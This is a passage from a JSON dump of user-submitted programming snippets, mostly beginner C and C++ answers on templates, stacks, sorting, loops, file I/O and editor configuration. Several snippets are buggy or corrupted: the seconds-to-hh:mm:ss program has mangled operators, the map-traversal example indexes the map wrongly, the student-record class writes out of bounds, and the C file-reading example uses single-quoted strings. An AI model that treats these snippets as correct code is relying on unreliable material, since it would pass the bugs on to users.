    "description": "#include <iostream> #include <string>  using namespace std;  template <typename T> inline T const& Max (T const& a, T const& b) {     return a < b ? b:a;  }  int main () {    int i = 39;    int j = 20;    cout << \"Max(i, j): \" << Max(i, j) << endl;      double f1 = 13.5;     double f2 = 20.7;     cout << \"Max(f1, f2): \" << Max(f1, f2) << endl;      string s1 = \"Hello\";     string s2 = \"World\";     cout << \"Max(s1, s2): \" << Max(s1, s2) << endl;      return 0; }\n#include <iostream> #include <vector> #include <cstdlib> #include <string> #include <stdexcept>  using namespace std;  template <class T> class Stack {     private:        vector<T> elems;    // elements      public:        void push(T const&);  // push element        void pop();               // pop element        T top() const;            // return top element               bool empty() const {      // return true if empty.          return elems.empty();        }  };   template <class T> void Stack<T>::push (T const& elem) {     // append copy of passed element     elems.push_back(elem);     }   template <class T> void Stack<T>::pop () {     if (elems.empty()) {        throw out_of_range(\"Stack<>::pop(): empty stack\");     }        // remove last element     elems.pop_back();          }   template <class T> T Stack<T>::top () const {     if (elems.empty()) {        throw out_of_range(\"Stack<>::top(): empty stack\");     }        // return copy of last element     return elems.back();       }   int main() {     try {       Stack<int>         intStack;  // stack of ints        Stack<string> stringStack;    // stack of strings         // manipulate int stack        intStack.push(7);        cout << intStack.top() <<endl;         // manipulate string stack        stringStack.push(\"hello\");        cout << stringStack.top() << std::endl;        stringStack.pop();        stringStack.pop();     } catch (exception const& ex) {        cerr << \"Exception: \" << ex.what() <<endl;        return -1;    }  } \n",
    "reg_date": "2021-10-12T11:37:08.000Z"
  },
  {
    "id": 394,
    "keyword": null,
    "link": null,
    "title": " Temporary file using MSFT API in cpp",
    "description": "using namespace System::Security;using namespace System::IO; ... String tempFolder;try {  tempFolder = Path::GetTempPath();}catch(SecurityException* ex){  // probably means that you don't have the required permissions}catch(Exception* ex){  // handle all other exceptions}\n",
    "reg_date": "2021-10-12T11:37:08.000Z"
  },
  {
    "id": 395,
    "keyword": null,
    "link": null,
    "title": " The number of swaps required in selection sort",
    "description": "#include <bits/stdc++.h> using namespace std;   typedef long long ll;   ll a[111111], tmp[111111], ans;   void merge_sort(ll a[], ll b[], ll lo, ll hi) {     ll i, j, k;       if (lo >= hi)         return;       ll mid = (lo + hi) / 2;       merge_sort(a, b, lo, mid);     merge_sort(a, b, mid + 1, hi);       i = lo;     j = mid + 1;       for (k = lo; k <= hi; k++)         if (j > hi)             b[k] = a[i++];         else if (i > mid)             b[k] = a[j++];         else if (a[i] <= a[j])             b[k] = a[i++];         else         {             b[k] = a[j++];             ans += mid - i + 1;         }       for (i = lo; i <= hi; i++)         a[i] = b[i]; }   int main(void) {     ll t;       scanf(\"%lld\", &t);       while (t--)     {         ll n, i;           scanf(\"%lld\", &n);         for (i = 1; i <= n; i++)             scanf(\"%lld\", &a[i]);           ans = 0;         merge_sort(a, tmp, 1, n);           printf(\"%lld\\n\", ans);     }     return 0; }\n",
    "reg_date": "2021-10-12T11:37:08.000Z"
  },
  {
    "id": 396,
    "keyword": null,
    "link": null,
    "title": " The smallest element from three",
    "description": "int x = min(min(a, b), c); int x = min({a, b, c});\n",
    "reg_date": "2021-10-12T11:37:08.000Z"
  },
  {
    "id": 397,
    "keyword": null,
    "link": null,
    "title": " The syntax to decexample of a function declarationlare a function is:",
    "description": "// function declaration void greet() {     cout << \"Hello World\"; }\n",
    "reg_date": "2021-10-12T11:37:08.000Z"
  },
  {
    "id": 398,
    "keyword": null,
    "link": null,
    "title": " The syntax to declare a function is:",
    "description": "returnType functionName (parameter1, parameter2,...) {     // function body    }\n",
    "reg_date": "2021-10-12T11:37:08.000Z"
  },
  {
    "id": 399,
    "keyword": null,
    "link": null,
    "title": " The while clause in the C++ do while statement ends with a       .",
    "description": "The while clause in the C++ do while statement ends with a ______.\n",
    "reg_date": "2021-10-12T11:37:08.000Z"
  },
  {
    "id": 400,
    "keyword": null,
    "link": null,
    "title": " To delete all the elements from a vector in C++",
    "description": "vectorname.clear()\n",
    "reg_date": "2021-10-12T11:37:08.000Z"
  },
  {
    "id": 401,
    "keyword": null,
    "link": null,
    "title": " To toggle (flip the status of) the k-th item of the set",
    "description": "A ^ = (1 << k)\n",
    "reg_date": "2021-10-12T11:37:09.000Z"
  },
  {
    "id": 402,
    "keyword": null,
    "link": null,
    "title": " Tower of Hanoi Iterative C initstack",
    "description": "// C Program for Iterative Tower of Hanoi  #include <stdio.h>  #include <math.h>  #include <stdlib.h>  #include <limits.h>   // A structure to represent a stack  struct Stack  {  unsigned capacity;  int top;  int *array;  };   // function to create a stack of given capacity.  struct Stack* createStack(unsigned capacity)  {  \tstruct Stack* stack =  \t\t(struct Stack*) malloc(sizeof(struct Stack));  \tstack -> capacity = capacity;  \tstack -> top = -1;  \tstack -> array =  \t\t(int*) malloc(stack -> capacity * sizeof(int));  \treturn stack;  }   // Stack is full when top is equal to the last index  int isFull(struct Stack* stack)  {  return (stack->top == stack->capacity - 1);  }   // Stack is empty when top is equal to -1  int isEmpty(struct Stack* stack)  {  return (stack->top == -1);  }   // Function to add an item to stack. It increases  // top by 1  void push(struct Stack *stack, int item)  {  \tif (isFull(stack))  \t\treturn;  \tstack -> array[++stack -> top] = item;  }   // Function to remove an item from stack. It  // decreases top by 1  int pop(struct Stack* stack)  {  \tif (isEmpty(stack))  \t\treturn INT_MIN;  \treturn stack -> array[stack -> top--];  }   //Function to show the movement of disks  void moveDisk(char fromPeg, char toPeg, int disk)  {  \tprintf(\"Move the disk %d from \\'%c\\' to \\'%c\\'\\n\",  \t\tdisk, fromPeg, toPeg);  }   // Function to implement legal movement between  // two poles  void moveDisksBetweenTwoPoles(struct Stack *src,  \t\t\tstruct Stack *dest, char s, char d)  {  \tint pole1TopDisk = pop(src);  \tint pole2TopDisk = pop(dest);   \t// When pole 1 is empty  \tif (pole1TopDisk == INT_MIN)  \t{  \t\tpush(src, pole2TopDisk);  \t\tmoveDisk(d, s, pole2TopDisk);  \t}   \t// When pole2 pole is empty  \telse if (pole2TopDisk == INT_MIN)  \t{  \t\tpush(dest, pole1TopDisk);  \t\tmoveDisk(s, d, pole1TopDisk);  \t}   \t// When top disk of pole1 > top disk of pole2  \telse if (pole1TopDisk > pole2TopDisk)  \t{  \t\tpush(src, pole1TopDisk);  \t\tpush(src, pole2TopDisk);  \t\tmoveDisk(d, s, pole2TopDisk);  \t}   \t// When top disk of pole1 < top disk of pole2  \telse \t{  \t\tpush(dest, pole2TopDisk);  \t\tpush(dest, pole1TopDisk);  \t\tmoveDisk(s, d, pole1TopDisk);  \t}  }   //Function to implement TOH puzzle  void tohIterative(int num_of_disks, struct Stack  \t\t\t*src, struct Stack *aux,  \t\t\tstruct Stack *dest)  {  \tint i, total_num_of_moves;  \tchar s = 'S', d = 'D', a = 'A';   \t//If number of disks is even, then interchange  \t//destination pole and auxiliary pole  \tif (num_of_disks % 2 == 0)  \t{  \t\tchar temp = d;  \t\td = a;  \t\ta = temp;  \t}  \ttotal_num_of_moves = pow(2, num_of_disks) - 1;   \t//Larger disks will be pushed first  \tfor (i = num_of_disks; i >= 1; i--)  \t\tpush(src, i);   \tfor (i = 1; i <= total_num_of_moves; i++)  \t{  \t\tif (i % 3 == 1)  \t\tmoveDisksBetweenTwoPoles(src, dest, s, d);   \t\telse if (i % 3 == 2)  \t\tmoveDisksBetweenTwoPoles(src, aux, s, a);   \t\telse if (i % 3 == 0)  \t\tmoveDisksBetweenTwoPoles(aux, dest, a, d);  \t}  }   // Driver Program  int main()  {  \t// Input: number of disks  \tunsigned num_of_disks = 3;   \tstruct Stack *src, *dest, *aux;   \t// Create three stacks of size 'num_of_disks'  \t// to hold the disks  \tsrc = createStack(num_of_disks);  \taux = createStack(num_of_disks);  \tdest = createStack(num_of_disks);   \ttohIterative(num_of_disks, src, aux, dest);  \treturn 0;  }  \n",
    "reg_date": "2021-10-12T11:37:09.000Z"
  },
  {
    "id": 403,
    "keyword": null,
    "link": null,
    "title": " Traversing a map",
    "description": "int arr[] = { 1, 1, 2, 1,  3, 1, 4, 3 }; map<int, int> m; for (auto i: arr) \tm[arr[i]]++; cout << \"Element  Frequency\" << endl; for (auto& [k,v] : m) // Since c++17 \tcout << k << \"   \" << v << endl;\n",
    "reg_date": "2021-10-12T11:37:09.000Z"
  },
  {
    "id": 404,
    "keyword": null,
    "link": null,
    "title": " Turn the bank details struct into a class",
    "description": "#include <iostream> #include <fstream> #include <string> #include <iomanip> #include <fstream> using namespace std;  #define a_row 10 #define a_col 6  ifstream inputname, inputscore;  class studentRecord { private: \tstring name[a_row]; \tint grade[a_col]; \tint sum; \tdouble average; \tchar letter; public: \tstudentRecord(); \t/*void readStudentData(string name, int grade); \tvoid printStudentData(string name, int grade); \tint sumOfGrade(int grade, int sum); \tdouble averageGrade(int sum, double average); \tvoid letterGrade(double average, char letter); \tvoid printStudentData2(string name, int grade, int sum, double average, char letter);*/ };  studentRecord::studentRecord() { \tinputname.open(\"name.txt\"); \tinputscore.open(\"grade.txt\");  \tfor (int r = 0; r < a_row; r++) \t{ \t\tinputname >> name[a_row]; \t\tfor (int i = 0; i < a_col; i++) \t\t{ \t\t\tinputscore >> grade[a_col]; \t\t} \t} \t }  //int studentRecord::sumOfGrade(int grade, int sum) //{ // //}  void main() { \tstudentRecord student; \tsystem(\"pause\"); }\n",
    "reg_date": "2021-10-12T11:37:09.000Z"
  },
  {
    "id": 405,
    "keyword": null,
    "link": null,
    "title": " TypeError: unsupported operand type(s) for +: 'int' and 'str'",
    "description": "#this is a int Anmol = 1  #this is a str Mom = \"1\"  Anmol + Mom #if you add you get someting that looks like this #TypeError: unsupported operand type(s) for -: 'str' and 'int' #to fix do the following  Anmol + str(Mom)\nfrom tkinter import IntVar X = IntVar() X.set(X.get() + 1)\n# Error: TypeError: unsupported operand type(s) for /: 'str' and 'str'      # Solution: # You're probably mixing strings and integers. Make sure to either  # convert integers to strings with str(int) or strings to integers/floats # with int(string) or float(string) depending on what you're doing. Example:int + string = error correct example: int + int = no error                   string + string = no error\n# use and in stead of & in python\ndo not combine int with string ! Example:int + string = error correct example: int + int = no error                   string + string = no error\n",
    "reg_date": "2021-10-12T11:37:09.000Z"
  },
  {
    "id": 406,
    "keyword": null,
    "link": null,
    "title": " UENUM ue4",
    "description": " UENUM(BlueprintType)  enum class GroundDirection : uint8 {       DOWN = 0 UMETA(DisplayName = \"DOWN\"),       LEFT = 1  UMETA(DisplayName = \"LEFT\"),       UP = 2     UMETA(DisplayName = \"UP\"),       RIGHT = 3   }\n",
    "reg_date": "2021-10-12T11:37:09.000Z"
  },
  {
    "id": 407,
    "keyword": null,
    "link": null,
    "title": " UPARAM(ref)",
    "description": "UFUNCTION(BlueprintCallable, DisplayName = \"Add\", Category = \"ProceduralGeneration|Noises\") static UGenerationModule* ConstructAdd(UPARAM(ref) UGenerationModule*& ModuleA, UPARAM(ref) UGenerationModule*& ModuleB);Copy\n",
    "reg_date": "2021-10-12T11:37:09.000Z"
  },
  {
    "id": 408,
    "keyword": null,
    "link": null,
    "title": " Uncaught Error: Unsupported operation: StdIOUtils. getStdioOutputStream",
    "description": "dartpad is an online editor or compiler which does not support dart:io or any other libraries by dart.  In simple, to use stdin or stdout use vscode or any editor with SDK. Since, dart pad does not support this package/library.  sorry for any mistake, I am still a newbie and I found this info. on stackoverflow.\n",
    "reg_date": "2021-10-12T11:37:09.000Z"
  },
  {
    "id": 409,
    "keyword": null,
    "link": null,
    "title": " Union of two arrays leetcode",
    "description": "Input: nums1 = [4,9,5], nums2 = [9,4,9,8,4] Output: [9,4] Explanation: [4,9] is also accepted. \n",
    "reg_date": "2021-10-12T11:37:09.000Z"
  },
  {
    "id": 410,
    "keyword": null,
    "link": null,
    "title": " Use of undeclared identifier ' O U16TEXT'",
    "description": "#include <iostream> #include <fcntl.h> #include <io.h> #include <stdio.h>  int main() {     _setmode(_fileno(stdout), 0x00020000); // _O_U16TEXT     std::wcout << L\"Русский текст\\n\"; } \n",
    "reg_date": "2021-10-12T11:37:09.000Z"
  },
  {
    "id": 411,
    "keyword": null,
    "link": null,
    "title": " Using functions in Class",
    "description": "class Student{     int scores[5];     public:     void input(){         for(int i=0; i<5; i++){             cin >> scores[i];         }     }     int calculateTotalScore(){         int total = 0;         for(int i=0; i<5; i++){             total += scores[i];         }         return total;     } }; \n",
    "reg_date": "2021-10-12T11:37:10.000Z"
  },
  {
    "id": 412,
    "keyword": null,
    "link": null,
    "title": " Vector2 c++",
    "description": "struct Vector2 {   float x;   float y; }; // ez money rn\n",
    "reg_date": "2021-10-12T11:37:10.000Z"
  },
  {
    "id": 413,
    "keyword": null,
    "link": null,
    "title": " ViewController import",
    "description": "import { Component } from '@angular/core'; import { ViewController } from 'ionic-angular';  @Component({...}) export class MyPage{    constructor(public viewCtrl: ViewController) {}  } \n",
    "reg_date": "2021-10-12T11:37:10.000Z"
  },
  {
    "id": 414,
    "keyword": null,
    "link": null,
    "title": " Visual Studio Code: code not running for C++11",
    "description": "C_Cpp.default.includePath                          : string[] C_Cpp.default.defines                              : string[] C_Cpp.default.compileCommands                      : string C_Cpp.default.macFrameworkPath                     : string[] C_Cpp.default.forcedInclude                        : string[] C_Cpp.default.intelliSenseMode                     : string C_Cpp.default.compilerPath                         : string C_Cpp.default.cStandard                            : c89 | c99 | c11 C_Cpp.default.cppStandard                          : c++98 | c++03 | c++11 | c++14 | c++17 C_Cpp.default.browse.path                          : string[] C_Cpp.default.browse.databaseFilename              : string C_Cpp.default.browse.limitSymbolsToIncludedHeaders : boolean\n",
    "reg_date": "2021-10-12T11:37:10.000Z"
  },
  {
    "id": 415,
    "keyword": null,
    "link": null,
    "title": " Visual studio code include path not working c++",
    "description": "// task.json // add this line (with your path) '\"-Ipath/to/my/include/files\",' to first line in \"args\"[] // example: {   \t\"version\": \"2.0.0\"     \"tasks\": [         {           \t//...             \"args\": [               \t\"-I${workspaceFolder}\\\\Headers\",                 \"-g\",                 \"${file}\",                 \"-o\",                 \"${fileDirname}\\\\${fileBasenameNoExtension}.exe\"             ],           \t//...             \"options\": {                 \"cwd\": \"${fileDirname}\"             },             \"problemMatcher\": [                 \"$gcc\"             ],             \"group\": {                 \"kind\": \"build\",                 \"isDefault\": true             },             \"detail\": \"Task generated by Debugger.\"         }     ], }\n",
    "reg_date": "2021-10-12T11:37:10.000Z"
  },
  {
    "id": 416,
    "keyword": null,
    "link": null,
    "title": " Vs Code cpp not run",
    "description": "\"cpp\": \"cd $dir && g++ $fileName -o $fileNameWithoutExt -static && $dir$fileNameWithoutExt\", \n",
    "reg_date": "2021-10-12T11:37:10.000Z"
  },
  {
    "id": 417,
    "keyword": null,
    "link": null,
    "title": " What is This pointer? Explain with an Example.",
    "description": "Every object in C++ has access to its own address through an important pointer called this pointer. The this pointer is an implicit parameter to all member functions. Therefore, inside a member function, this may be used to refer to the invoking object.  Example: #include <iostream> using namespace std; class Demo { private:   int num;   char ch; public:   void setMyValues(int num, char ch){     this->num =num;     this->ch=ch;   }   void displayMyValues(){     cout<<num<<endl;     cout<<ch;   } }; int main(){   Demo obj;   obj.setMyValues(100, 'A');   obj.displayMyValues();   return 0; } \n",
    "reg_date": "2021-10-12T11:37:10.000Z"
  },
  {
    "id": 418,
    "keyword": null,
    "link": null,
    "title": " What is a ~ in c++",
    "description": "class Entity{   public:    \t~Destructor();   \t//This is a destructor, which destroys instances and can free up memory. };  //Source for answer: // https://stackoverflow.com/questions/1395506/in-c-what-does-a-tilde-before-a-function-name-signify  //Other Sources: // https://www.ibm.com/support/knowledgecenter/en/ssw_ibm_i_74/rzarg/cplr380.htm\n",
    "reg_date": "2021-10-12T11:37:10.000Z"
  },
  {
    "id": 419,
    "keyword": null,
    "link": null,
    "title": " What is the meaning of inheritance in C++. Write an example of simple inheritance.",
    "description": "Inheritance is one of the key features of Object-oriented programming in C++. It allows us to create a new class (derived class) from an existing class (base class).  The derived class inherits the features from the base class and can have additional features of its own.    For example,  class Animal {     // eat() function     // sleep() function };  class Dog : public Animal {     // bark() function }; Here, the Dog class is derived from the Animal class.  Since Dog is derived from Animal, members of Animal are accessible to Dog.  Notice the use of the keyword public while inheriting Dog from Animal.  class Dog : public Animal {...}; We can also use the keywords private and protected instead of public  Example: // C++ program to demonstrate inheritance  #include <iostream> using namespace std;  // base class class Animal {     public:     void eat() {         cout << \"I can eat!\" << endl;     }      void sleep() {         cout << \"I can sleep!\" << endl;     } };  // derived class class Dog : public Animal {      public:     void bark() {         cout << \"I can bark! Woof woof!!\" << endl;     } };  int main() {     // Create object of the Dog class     Dog dog1;      // Calling members of the base class     dog1.eat();     dog1.sleep();      // Calling member of the derived class     dog1.bark();      return 0; } Output  I can eat! I can sleep! I can bark! Woof woof!! Here, dog1 (the object of derived class Dog) can access members of the base class Animal. It's because Dog is inherited from Animal.\n",
    "reg_date": "2021-10-12T11:37:10.000Z"
  },
  {
    "id": 420,
    "keyword": null,
    "link": null,
    "title": " While loop in c++",
    "description": "while (true) { // you can also put 1 or true: while (1) \t//do stuff }\ndo {    // codes; } while (testExpression);\nwhile (test_expression) {    // statements     update_expression; }\nwhile (x != 0){ ... }\ndo {    statement(s); } while(condition);\nwhile (x){ ... }\n",
    "reg_date": "2021-10-12T11:37:11.000Z"
  },
  {
    "id": 421,
    "keyword": null,
    "link": null,
    "title": " Write a C++ program using class and objects. You have to define multiple-member functions outside class and all those functions will be the same name",
    "description": "#include <iostream>  using namespace std;  class Box {    public:       double length;         // Length of a box       double breadth;        // Breadth of a box       double height;         // Height of a box        // Member functions declaration       double getVolume(void);       void setLength( double len );       void setBreadth( double bre );       void setHeight( double hei ); };  // Member functions definitions double Box::getVolume(void) {    return length * breadth * height; }  void Box::setLength( double len ) {    length = len; } void Box::setBreadth( double bre ) {    breadth = bre; } void Box::setHeight( double hei ) {    height = hei; }  // Main function for the program int main() {    Box Box1;                // Declare Box1 of type Box    Box Box2;                // Declare Box2 of type Box    double volume = 0.0;     // Store the volume of a box here      // box 1 specification    Box1.setLength(6.0);     Box1.setBreadth(7.0);     Box1.setHeight(5.0);     // box 2 specification    Box2.setLength(12.0);     Box2.setBreadth(13.0);     Box2.setHeight(10.0);     // volume of box 1    volume = Box1.getVolume();    cout << \"Volume of Box1 : \" << volume <<endl;     // volume of box 2    volume = Box2.getVolume();    cout << \"Volume of Box2 : \" << volume <<endl;    return 0; }\n",
    "reg_date": "2021-10-12T11:37:11.000Z"
  },
  {
    "id": 422,
    "keyword": null,
    "link": null,
    "title": " Write a C++ program using for loop to find whether the number is an Armstrong number or not.",
    "description": "sum of cubes of the digits\n#include <iostream> using namespace std;  int main() {     int num, originalNum, remainder, result = 0;     cout << \"Enter a three-digit integer: \";     cin >> num;     originalNum = num;      while (originalNum != 0) {         // remainder contains the last digit         remainder = originalNum % 10;                  result += remainder * remainder * remainder;                  // removing last digit from the orignal number         originalNum /= 10;     }      if (result == num)         cout << num << \" is an Armstrong number.\";     else         cout << num << \" is not an Armstrong number.\";      return 0; }\n",
    "reg_date": "2021-10-12T11:37:11.000Z"
  },
  {
    "id": 423,
    "keyword": null,
    "link": null,
    "title": " Write a CPP program to calculate sum of first N natural numbers",
    "description": "// Method 1: Mathematical -> Sum up numbers from 1 to n  int sum(int n){ \treturn (n * (n+1)) / 2; }  // Method 2: Using a for-loop -> Sum up numbers from 1 to n  int sum(int n){ \tint tempSum = 0;    \tfor (int i = n; i > 0; i--){      \ttempSum += i;       }   \treturn tempSum;  }  // Method 3: Using recursion -> Sum up numbers from 1 to n  int sum(int n){ \treturn n > 0 ? n + sum(n-1) : 0;  }\n #include <iostream>  using namespace std;  int main(){ \tint N,i,sum=0; \tcin>>N;      for(i=0;i<=N;)      {          sum=sum+N;         N--;      }      cout<<sum; } \n",
    "reg_date": "2021-10-12T11:37:11.000Z"
  },
  {
    "id": 424,
    "keyword": null,
    "link": null,
    "title": " Write a  c++ loop to read n characters from the keyboard and store them in the vector v.",
    "description": "for(int i = 0; i < n; i++)     {       cin >> ch;       v.push_back(ch);     }\n",
    "reg_date": "2021-10-12T11:37:11.000Z"
  },
  {
    "id": 425,
    "keyword": null,
    "link": null,
    "title": " Write a c++ program that reads a sentence (including spaces) and a word, then print out the number of occurrences of the word in the sentence",
    "description": "Write a c++ program that reads a sentence (including spaces) and a word, then print out the number of occurrences of the word in the sentence\n",
    "reg_date": "2021-10-12T11:37:11.000Z"
  },
  {
    "id": 426,
    "keyword": null,
    "link": null,
    "title": " Write a c++ program to print number triangle.",
    "description": "#include <iostream>   using namespace std;   int main()   {   int i,j,k,l,n;     cout<<\"Enter the Range=\";     cin>>n;     for(i=1;i<=n;i++)     {     for(j=1;j<=n-i;j++)     {     cout<<\" \";     }     for(k=1;k<=i;k++)     {     cout<<k;     }     for(l=i-1;l>=1;l--)     {     cout<<l;     }     cout<<\"\\n\";     }     return 0;   }  \n",
    "reg_date": "2021-10-12T11:37:11.000Z"
  },
  {
    "id": 427,
    "keyword": null,
    "link": null,
    "title": " Write a function called clean that takes a C++ string as input and removes any characters in the string that are not letters except for space blanks.",
    "description": "// ALWAYS USE PASS BY REFERENCE WITH STRINGS AND VECTORS.  void clean ( string & str)  {    for ( int i = 0; i < str.length(); i++ )    {          if (str[i] != ' ' && (str[i] < 'A' || (str[i] > 'Z' && str[i] < 'a') || str[i] > 'z'))          {              str.replace(i, 1, \"\");              i--;          }    } }\n",
    "reg_date": "2021-10-12T11:37:11.000Z"
  },
  {
    "id": 428,
    "keyword": null,
    "link": null,
    "title": " Write a function called max size that takes a vector of strings as an input and returns the string with the maximum length.",
    "description": "// ALWAYS USE PASS BY REFERENCE WITH STRINGS AND VECTORS.  string max_size (const vector <string> & v)  {      string result;       for (int i = 0;  i < v.size(); i++)       {             if ( v[i].length() > result.length() )             {                result = v[i];              }       }    return result;  }\n",
    "reg_date": "2021-10-12T11:37:11.000Z"
  },
  {
    "id": 429,
    "keyword": null,
    "link": null,
    "title": " Write a loop to read n strings (containing no white space) from the keyboard and store them in the vector v.",
    "description": "for (int i = 0; i < n; i++)  {     cin >> s;     // NOTE: You cannot use push_back() here because     // the vector has been pre-allocated and pre-initialized     v[i] = s;  }\n",
    "reg_date": "2021-10-12T11:37:11.000Z"
  },
  {
    "id": 430,
    "keyword": null,
    "link": null,
    "title": " Write a program in \"dev -C++ \" that checks that every line is ending with semicolon(;)  in file \"program.txt\"",
    "description": "checks semicolon\n",
    "reg_date": "2021-10-12T11:37:12.000Z"
  },
  {
    "id": 431,
    "keyword": null,
    "link": null,
    "title": " Write a program in C++ that receives a series of integer values from the user.",
    "description": "#include<iostream>  using namespace std;  int main() {     int c, n, nth;     cout<<\"Enter the number of values to enter: \";     cin>>n;     int arrayV[n];     for(c=0;c<n;c++)     {         cout<<\"Enter the value for array value \"<<c<<\": \";         cin>>arrayV[c];     }     for(c=0;c<n;c++)     {         cout<<\"\\nValue \"<<c<<\" is \"<<arrayV[c];     }     cout<<\"\\n\\nEnter the index of the value you wish to remove: \";     cin>>nth;     if(nth>n)     {         cout<<\"\\n\\nIndex out of range: \";     }     else     {         for(c=nth;c<=n-1;c++)         {             arrayV[c]=arrayV[c+1];         }         for(c=0;c<n-1;c++)         {             cout<<\"\\nValue \"<<c<<\" is \"<<arrayV[c];         }     }     return 0;  }\n",
    "reg_date": "2021-10-12T11:37:12.000Z"
  },
  {
    "id": 432,
    "keyword": null,
    "link": null,
    "title": " Write a program that inputs test scores of a student and display his grade",
    "description": "#include <stdio.h> int main(void){ int num; printf(\"Enter your mark \"); scanf(\"%d\",&num); printf(\" You entered %d\", num); // printing outputs  \tif(num >= 80){ \tprintf(\" You got A grade\"); // printing outputs \t\t} \telse if ( num >=60){ // Note the space between else & if \t\tprintf(\" You got B grade\"); \t\t} \telse if ( num >=40){ \t\tprintf(\" You got C grade\"); \t\t} \telse if ( num < 40){ \t\tprintf(\" You Failed in this exam\"); \t\t} return 0; }\n",
    "reg_date": "2021-10-12T11:37:12.000Z"
  },
  {
    "id": 433,
    "keyword": null,
    "link": null,
    "title": " Write a program that inputs time in seconds and converts it into hh-mm-ss format",
    "description": "#include<iostream> using namespace std; int main() {  int t,h,m,s;  cout<<\"\\t Changing Time Format \"<<endl;  cout<<\"\\n\";  cout<<\"Enter time (in Seconds) \"<<endl;  cin>>t;  h=t/3600;  t=t600;  m=t/60;  t=t`;  s=t;  cout<<\"\\n\";  cout<<\"Time in HH:MM:SS is \"<<h<<\":\"<<m<<\":\"<<s<<endl; }\n",
    "reg_date": "2021-10-12T11:37:12.000Z"
  },
  {
    "id": 434,
    "keyword": null,
    "link": null,
    "title": " Write a program to find the sum of all sub-arrays of a given integer array.",
    "description": "long int SubArraySum( int arr[] , int n )  {      long int result = 0;         // computing sum of subarray using formula      for (int i=0; i<n; i++)          result += (arr[i] * (i+1) * (n-i));         // return all subarray sum      return result ;  } \n",
    "reg_date": "2021-10-12T11:37:12.000Z"
  },
  {
    "id": 435,
    "keyword": null,
    "link": null,
    "title": " Write a program to implement Liang-Bersky line clipping algorithm",
    "description": "#include<iostream.h> #include<graphics.h> #include<math.h> #include<dos.h>   void main() { \tint i,gd=DETECT,gm; \tint x1,y1,x2,y2,xmin,xmax,ymin,ymax,xx1,xx2,yy1,yy2,dx,dy; \tfloat t1,t2,p[4],q[4],temp; \t \tx1=120; \ty1=120; \tx2=300; \ty2=300; \t \txmin=100; \tymin=100; \txmax=250; \tymax=250; \t \tinitgraph(&gd,&gm,\"c:\\\\turboc3\\\\bgi\"); \trectangle(xmin,ymin,xmax,ymax); \tdx=x2-x1; \tdy=y2-y1; \t \tp[0]=-dx; \tp[1]=dx; \tp[2]=-dy; \tp[3]=dy; \t \tq[0]=x1-xmin; \tq[1]=xmax-x1; \tq[2]=y1-ymin; \tq[3]=ymax-y1; \t \tfor(i=0;i<4;i++) \t{ \t\tif(p[i]==0) \t\t{ \t\t\tcout<<\"line is parallel to one of the clipping boundary\"; \t\t\tif(q[i]>=0) \t\t\t{ \t\t\t\tif(i<2) \t\t\t\t{ \t\t\t\t\tif(y1<ymin) \t\t\t\t\t{ \t\t\t\t\t\ty1=ymin; \t\t\t\t\t} \t\t\t\t \t\t\t\t\tif(y2>ymax) \t\t\t\t\t{ \t\t\t\t\t\ty2=ymax; \t\t\t\t\t} \t\t\t\t \t\t\t\t\tline(x1,y1,x2,y2); \t\t\t\t} \t\t\t\t \t\t\t\tif(i>1) \t\t\t\t{ \t\t\t\t\tif(x1<xmin) \t\t\t\t\t{ \t\t\t\t\t\tx1=xmin; \t\t\t\t\t} \t\t\t\t\t \t\t\t\t\tif(x2>xmax) \t\t\t\t\t{ \t\t\t\t\t\tx2=xmax; \t\t\t\t\t} \t\t\t\t\t \t\t\t\t\tline(x1,y1,x2,y2); \t\t\t\t} \t\t\t} \t\t} \t} \t \tt1=0; \tt2=1; \t \tfor(i=0;i<4;i++) \t{ \t\ttemp=q[i]/p[i]; \t\t \t\tif(p[i]<0) \t\t{ \t\t\tif(t1<=temp) \t\t\t\tt1=temp; \t\t} \t\telse \t\t{ \t\t\tif(t2>temp) \t\t\t\tt2=temp; \t\t} \t} \t \tif(t1<t2) \t{ \t\txx1 = x1 + t1 * p[1]; \t\txx2 = x1 + t2 * p[1]; \t\tyy1 = y1 + t1 * p[3]; \t\tyy2 = y1 + t2 * p[3]; \t\tline(xx1,yy1,xx2,yy2); \t} \t \tdelay(5000); \tclosegraph(); } \n",
    "reg_date": "2021-10-12T11:37:12.000Z"
  },
  {
    "id": 436,
    "keyword": null,
    "link": null,
    "title": " Write a program to print following pattern; 1 1 2 1 2 3 1 2 3 4",
    "description": "#include <stdio.h> int main() {    int i, j, rows;    printf(\"Enter the number of rows: \");    scanf(\"%d\", &rows);    for (i = 1; i <= rows; ++i) {       for (j = 1; j <= i; ++j) {          printf(\"%d \", j);       }       printf(\"\\n\");    }    return 0; } \n",
    "reg_date": "2021-10-12T11:37:12.000Z"
  },
  {
    "id": 437,
    "keyword": null,
    "link": null,
    "title": " Write a program to sort an array 100,200,20, 75,89.198, 345,56,34,35 using Bubble Sort. The program should be able to display total number of passes used for sorted data in given data set.",
    "description": "void swap(int *xp, int *yp)  {      int temp = *xp;      *xp = *yp;      *yp = temp;  }     // An optimized version of Bubble Sort  void bubbleSort(int arr[], int n)  {     int i, j;     bool swapped;     for (i = 0; i < n-1; i++)     {       swapped = false;       for (j = 0; j < n-i-1; j++)       {          if (arr[j] > arr[j+1])          {             swap(&arr[j], &arr[j+1]);             swapped = true;          }       }          // IF no two elements were swapped by inner loop, then break       if (swapped == false)          break;     }  } \n",
    "reg_date": "2021-10-12T11:37:12.000Z"
  },
  {
    "id": 438,
    "keyword": null,
    "link": null,
    "title": " Write a program to write content into text file.",
    "description": "/*Program to read from file using getc() function*/ #include <stdio.h> int main() {  FILE *fp;  char ch;  /*Open file in read mode*/  fp= fopen ('example.txt', 'r');  while( (ch = getc(fp)) != EOF) {   /*getc() function reads a character and its value is stored in variable 'ch' until EOF is encountered*/   printf('%ch', ch);  }   fclose(fp);   return 0; }\n//C++ program to write and read text in/from file. #include <iostream> #include <fstream>   using namespace std;   int main() {    fstream file; //object of fstream class         //opening file \"sample.txt\" in out(write) mode    file.open(\"sample.txt\",ios::out);         if(!file)    {        cout<<\"Error in creating file!!!\"<<endl;        return 0;    }         cout<<\"File created successfully.\"<<endl;    //write text into file    file<<\"ABCD.\";    //closing the file    file.close();         //again open file in read mode    file.open(\"sample.txt\",ios::in);         if(!file)    {        cout<<\"Error in opening file!!!\"<<endl;        return 0;    }            //read untill end of file is not found.    char ch; //to read single character    cout<<\"File content: \";         while(!file.eof())    {        file>>ch; //read single character from file        cout<<ch;    }         file.close(); //close file         return 0; } \n",
    "reg_date": "2021-10-12T11:37:12.000Z"
  },
  {
    "id": 439,
    "keyword": null,
    "link": null,
